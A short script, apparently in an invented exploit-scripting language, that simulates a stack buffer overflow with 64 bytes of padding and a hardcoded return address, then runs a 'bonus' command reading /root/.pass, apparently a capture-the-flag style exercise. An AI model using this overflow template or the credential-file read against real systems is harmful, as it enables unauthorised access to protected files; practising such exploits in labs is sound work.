# 🎯 Classic stack overflow with controlled return address
# This simulates a buffer overflow on a binary that accepts input from stdin

include "exploit/stack_smash.my"

# Run a basic test payload for smashing a buffer with known return
stack_smash("A" * 64, "0x080484f6")  # Replace with real RET addr from gdb

# Bonus: call shell
run command "cat /root/.pass"
